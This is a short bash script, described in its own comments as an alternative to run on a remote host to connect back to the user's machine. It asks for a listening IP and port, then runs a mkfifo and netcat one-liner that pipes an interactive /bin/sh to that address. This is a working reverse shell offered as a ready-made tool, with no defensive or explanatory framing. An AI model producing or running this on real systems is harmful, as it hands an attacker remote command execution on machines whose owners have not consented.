#!/bin/bash

#This is an alternative bash script to run on the remote host to connect back
# to your machine.

#local machine IP
echo "Enter your IP"
read LHOST

#local machine listening port
echo "Enter the listening port"
read LPORT

echo "Press [Enter] to connect to local host"
read enter

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT > /tmp/f
